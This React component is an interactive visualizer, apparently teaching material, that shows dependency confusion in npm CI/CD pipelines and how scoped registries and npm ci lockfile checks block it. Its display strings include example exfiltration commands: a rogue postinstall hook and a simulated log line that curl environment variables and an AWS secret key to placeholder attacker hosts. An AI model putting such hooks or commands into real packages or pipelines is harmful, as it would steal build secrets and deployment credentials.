import React, { useState } from 'react';
import {
  Package,
  ShieldCheck,
  ShieldAlert,
  Cloud,
  Terminal,
  AlertTriangle,
  Play,
} from 'lucide-react';

interface Props {
  currentStep: number;
}

export const SupplyChainVisualizer: React.FC<Props> = ({ currentStep: _currentStep }) => {
  const [pipelineMode, setPipelineMode] = useState<'vulnerable' | 'hardened'>('hardened');
  const [attackerInjected, setAttackerInjected] = useState<boolean>(true);
  const [buildRan, setBuildRan] = useState<boolean>(false);

  const internalPackage = 'internal-auth-token';
  const internalVersion = '1.4.0';
  const attackerVersion = '99.0.0';

  const isExploitTriggered = buildRan && attackerInjected && pipelineMode === 'vulnerable';

  const runBuild = () => {
    setBuildRan(true);
  };

  return (
    <div className="w-full bg-parchment-50 dark:bg-parchment-900 border border-parchment-200 dark:border-parchment-800 rounded-2xl p-6 shadow-sm overflow-hidden">
      {/* Header and Controls */}
      <div className="flex flex-wrap items-center justify-between gap-4 pb-5 border-b border-parchment-200 dark:border-parchment-800">
        <div>
          <span className="text-xs font-mono uppercase tracking-wider text-parchment-400 dark:text-parchment-400">
            Software Supply Chain & CI/CD Pipeline Defense
          </span>
          <h3 className="text-xl font-serif font-semibold text-ink-light dark:text-ink-dark flex items-center gap-2">
            Dependency Confusion & Lockfile Integrity (npm ci)
          </h3>
        </div>

        {/* Defense Mode Knob */}
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() => {
              setPipelineMode(pipelineMode === 'hardened' ? 'vulnerable' : 'hardened');
              setBuildRan(false);
            }}
            className={`px-3 py-1.5 text-xs font-mono font-medium rounded-lg border transition-all flex items-center gap-1.5 ${
              pipelineMode === 'hardened'
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-700 dark:text-emerald-400 font-bold'
                : 'bg-red-500/10 border-red-500/30 text-red-700 dark:text-red-400 font-bold'
            }`}
          >
            {pipelineMode === 'hardened' ? (
              <ShieldCheck className="w-3.5 h-3.5" />
            ) : (
              <ShieldAlert className="w-3.5 h-3.5" />
            )}
            CI Pipeline:{' '}
            {pipelineMode === 'hardened'
              ? 'npm ci + Scoped Registry [SECURE]'
              : 'npm install + Unscoped Registries [VULNERABLE]'}
          </button>

          <button
            onClick={() => {
              setAttackerInjected(!attackerInjected);
              setBuildRan(false);
            }}
            className={`px-3 py-1.5 text-xs font-mono font-medium rounded-lg border transition-all flex items-center gap-1.5 ${
              attackerInjected
                ? 'bg-amber-500/10 border-amber-500/30 text-amber-700 dark:text-amber-400'
                : 'bg-parchment-100 dark:bg-parchment-800 border-parchment-300 text-ink-muted'
            }`}
          >
            <AlertTriangle className="w-3.5 h-3.5" />
            Public Version 99.0.0 Uploaded: {attackerInjected ? 'YES' : 'NO'}
          </button>
        </div>
      </div>

      {/* Action Trigger Bar */}
      <div className="my-5 p-4 rounded-xl bg-parchment-100 dark:bg-parchment-950 border border-parchment-200 dark:border-parchment-800 flex items-center justify-between text-xs font-mono">
        <div className="flex items-center gap-2">
          <span className="font-bold text-ink-light dark:text-ink-dark">Target Dependency:</span>
          <code className="text-blue-600 dark:text-blue-400 font-bold">
            {pipelineMode === 'hardened' ? '@company/' : ''}
            {internalPackage}
          </code>
        </div>

        <button
          onClick={runBuild}
          className="px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-mono text-xs font-bold transition-all shadow-xs flex items-center gap-1.5 cursor-pointer"
        >
          <Play className="w-3.5 h-3.5" /> Run CI/CD Build Pipeline
        </button>
      </div>

      {/* 3 Physical Architecture Entities: Public Registry vs Private Registry vs CI/CD Runner */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-6">
        {/* Node 1: Public Registry (npmjs.com) */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800">
              <span className="text-xs font-mono font-bold text-ink-light dark:text-ink-dark flex items-center gap-1.5">
                <Cloud className="w-4 h-4 text-amber-500" /> Public Registry (npmjs.com)
              </span>
              <span className="text-[10px] font-mono text-ink-muted">Public Internet</span>
            </div>
            <div className="space-y-2 text-xs font-mono">
              {attackerInjected ? (
                <div className="p-2.5 bg-red-50 dark:bg-red-950/40 border border-red-200 dark:border-red-900/40 rounded text-red-700 dark:text-red-300">
                  <div className="font-bold text-[11px]">Rogue Package Registered:</div>
                  <div className="text-[10px] mt-0.5">name: "{internalPackage}"</div>
                  <div className="text-[10px] font-bold">version: "{attackerVersion}"</div>
                  <div className="text-[9px] text-red-500 mt-1">
                    postinstall: "curl attacker.com?keys=$(env)"
                  </div>
                </div>
              ) : (
                <div className="p-2.5 bg-parchment-50 dark:bg-parchment-900 rounded text-ink-muted text-[10px]">
                  No conflicting package registered.
                </div>
              )}
            </div>
          </div>
          <span className="text-[10px] font-mono text-ink-muted mt-3">
            Open to anyone on the internet to publish unreserved names.
          </span>
        </div>

        {/* Node 2: Private Internal Registry (Artifactory / Verdaccio) */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800">
              <span className="text-xs font-mono font-bold text-ink-light dark:text-ink-dark flex items-center gap-1.5">
                <Package className="w-4 h-4 text-purple-500" /> Internal Company Registry
              </span>
              <span className="text-[10px] font-mono text-purple-600 dark:text-purple-400">
                VPC Private
              </span>
            </div>
            <div className="space-y-2 text-xs font-mono">
              <div className="p-2.5 bg-purple-50 dark:bg-purple-950/30 border border-purple-200 dark:border-purple-900/30 rounded text-[10px]">
                <div className="font-bold text-purple-700 dark:text-purple-300">
                  Internal Genuine Package:
                </div>
                <div className="mt-0.5">
                  name: "{pipelineMode === 'hardened' ? '@company/' : ''}
                  {internalPackage}"
                </div>
                <div>version: "{internalVersion}"</div>
                <div className="text-parchment-400 mt-1">Legitimate authentication utilities</div>
              </div>
            </div>
          </div>
          <span className="text-[10px] font-mono text-ink-muted mt-3">
            Authenticated via corporate SSO tokens.
          </span>
        </div>

        {/* Node 3: CI/CD Build Runner */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800">
              <span className="text-xs font-mono font-bold text-ink-light dark:text-ink-dark flex items-center gap-1.5">
                <Terminal className="w-4 h-4 text-blue-500" /> CI/CD Runner Environment
              </span>
              <span className="text-[10px] font-mono text-blue-600 dark:text-blue-400">
                GitHub Actions / GitLab
              </span>
            </div>
            <div className="space-y-2 text-xs font-mono">
              <div className="p-2 bg-parchment-50 dark:bg-parchment-900 rounded text-[10px] space-y-1">
                <div>
                  Command:{' '}
                  <code className="font-bold">
                    {pipelineMode === 'hardened' ? 'npm ci' : 'npm install'}
                  </code>
                </div>
                <div>
                  Lockfile Verification:{' '}
                  <span
                    className={
                      pipelineMode === 'hardened'
                        ? 'text-emerald-600 font-bold'
                        : 'text-red-500 font-bold'
                    }
                  >
                    {pipelineMode === 'hardened' ? 'STRICT SHA-512' : 'SKIPPED / MUTABLE'}
                  </span>
                </div>
              </div>
              <div className="text-[10px] text-ink-muted">
                Has access to production build secrets, AWS keys, and deploy tokens.
              </div>
            </div>
          </div>
          <span className="text-[10px] font-mono text-ink-muted mt-3">
            Execution target of malicious postinstall hooks.
          </span>
        </div>
      </div>

      {/* Build Log Simulation */}
      <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 font-mono text-xs">
        <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800 text-ink-muted">
          <span className="uppercase font-bold text-[11px]">Runner Terminal Logs:</span>
          <span>
            Pipeline:{' '}
            {buildRan ? (isExploitTriggered ? 'FAILED (COMPROMISED)' : 'SUCCESS') : 'IDLE'}
          </span>
        </div>

        <div className="p-3 bg-parchment-950 rounded-lg text-emerald-400 text-[11px] font-mono overflow-x-auto leading-relaxed mb-4">
          {!buildRan ? (
            <span className="text-parchment-400">
              Click "Run CI/CD Build Pipeline" above to execute dependency resolution...
            </span>
          ) : isExploitTriggered ? (
            <div>
              <span className="text-parchment-400">$ npm install</span>
              <br />
              <span className="text-amber-400">Resolving {internalPackage}...</span>
              <br />
              <span className="text-red-400 font-bold">
                [DEPENDENCY CONFUSION] Found higher version {attackerVersion} on public npmjs.org!
              </span>
              <br />
              <span className="text-parchment-400">
                Downloading {internalPackage}@{attackerVersion}...
              </span>
              <br />
              <span className="text-red-400 font-bold">[POSTINSTALL HOOK TRIGGERED]</span>
              <br />
              <span className="text-amber-300">
                &gt; {internalPackage}@99.0.0 postinstall: curl -X POST
                https://attacker-c2.com/exfil -d "$AWS_SECRET_ACCESS_KEY"
                <br />
                HTTP 200 OK - Secrets exfiltrated successfully.
              </span>
            </div>
          ) : pipelineMode === 'hardened' && attackerInjected ? (
            <div>
              <span className="text-parchment-400">$ npm ci</span>
              <br />
              <span className="text-emerald-400">
                [SCOPED REGISTRY MATCH] @company/* strictly mapped to https://npm.corp.internal
              </span>
              <br />
              <span className="text-emerald-400">
                [INTEGRITY CHECK] Verifying package-lock.json sha512 checksums...
              </span>
              <br />
              <span className="text-parchment-400">
                Resolved @company/{internalPackage}@{internalVersion} (sha512-9xK2...). Public
                registry ignored.
              </span>
              <br />
              <span className="text-emerald-400 font-bold">
                ✓ 342 packages verified. Build completed safely.
              </span>
            </div>
          ) : (
            <div>
              <span className="text-parchment-400">$ npm ci</span>
              <br />
              <span className="text-emerald-400">
                ✓ All dependencies verified against lockfile. Build clean.
              </span>
            </div>
          )}
        </div>

        {/* Outcome Banner */}
        {isExploitTriggered ? (
          <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/40 text-red-700 dark:text-red-400 flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 flex-shrink-0" />
            <div>
              <div className="font-bold text-sm">
                DEPENDENCY CONFUSION EXPLOITED: Secrets Leaked!
              </div>
              <div className="text-[11px] opacity-90 mt-0.5">
                The package manager preferred version 99.0.0 on public npm over the internal
                registry. The attacker's package executed arbitrary code in CI and stole production
                deployment credentials (Alex Birsan breach model).
              </div>
            </div>
          </div>
        ) : buildRan ? (
          <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/40 text-emerald-700 dark:text-emerald-400 flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 flex-shrink-0" />
            <div>
              <div className="font-bold text-sm">
                SUPPLY CHAIN SHIELD ACTIVE: Build Verified & Isolated
              </div>
              <div className="text-[11px] opacity-90 mt-0.5">
                Using scoped organization prefixes (<code className="font-bold">@company/</code>)
                and immutable lockfile integrity checking (<code className="font-bold">npm ci</code>
                ) ensured only verified internal artifacts were executed.
              </div>
            </div>
          </div>
        ) : (
          <div className="p-3 rounded-lg bg-parchment-100 dark:bg-parchment-900 text-ink-muted">
            Toggle between the Vulnerable and Hardened pipeline modes to see how package managers
            handle conflicting package versions across registries.
          </div>
        )}
      </div>
    </div>
  );
};
